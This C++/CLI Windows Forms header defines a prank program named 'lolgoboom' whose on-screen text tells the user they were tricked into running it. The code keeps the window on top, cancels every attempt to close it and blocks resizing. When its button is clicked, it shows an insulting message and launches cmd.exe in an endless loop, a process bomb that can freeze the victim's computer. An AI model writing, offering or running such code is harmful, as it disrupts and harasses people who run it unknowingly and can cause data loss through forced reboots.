#pragma once

namespace lolgoboom {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace System::Diagnostics;

	/// <summary>
	/// Summary for lolgoboom
	/// </summary>
	public ref class lolgoboom : public System::Windows::Forms::Form
	{
	public:
		lolgoboom(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~lolgoboom()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Label^ label1;
	private: System::Windows::Forms::Button^ button1;
	protected:

	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->SuspendLayout();
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Location = System::Drawing::Point(28, 14);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(216, 39);
			this->label1->TabIndex = 0;
			this->label1->Text = L"Hello Sir, you have been tricked into running\nthis! Now you cant close this\nHAHAH"
				L"AHAHHAHAH!";
			// 
			// button1
			// 
			this->button1->Location = System::Drawing::Point(47, 147);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(175, 34);
			this->button1->TabIndex = 1;
			this->button1->Text = L"no.";
			this->button1->UseVisualStyleBackColor = true;
			this->button1->Click += gcnew System::EventHandler(this, &lolgoboom::button1_Click);
			// 
			// lolgoboom
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(284, 261);
			this->Controls->Add(this->button1);
			this->Controls->Add(this->label1);
			this->MaximizeBox = false;
			this->Name = L"lolgoboom";
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"OH FUCK!";
			this->TopMost = true;
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &lolgoboom::lolgoboom_FormClosing);
			this->ResizeBegin += gcnew System::EventHandler(this, &lolgoboom::lolgoboom_ResizeBegin);
			this->ResizeEnd += gcnew System::EventHandler(this, &lolgoboom::lolgoboom_ResizeEnd);
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void lolgoboom_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
		e->Cancel = true;
	}
	private: System::Void button1_Click(System::Object^ sender, System::EventArgs^ e) {
		MessageBox::Show("No u", "BITCH", MessageBoxButtons::OK, MessageBoxIcon::Error);
		for (;; )
		{
			Process::Start("cmd.exe");
		}
		
	}
	private: System::Void lolgoboom_ResizeBegin(System::Object^ sender, System::EventArgs^ e) {
		this->Size = System::Drawing::Size(300, 300);
	}
	private: System::Void lolgoboom_ResizeEnd(System::Object^ sender, System::EventArgs^ e) {
		this->Size = System::Drawing::Size(300, 300);
	}
	};
}
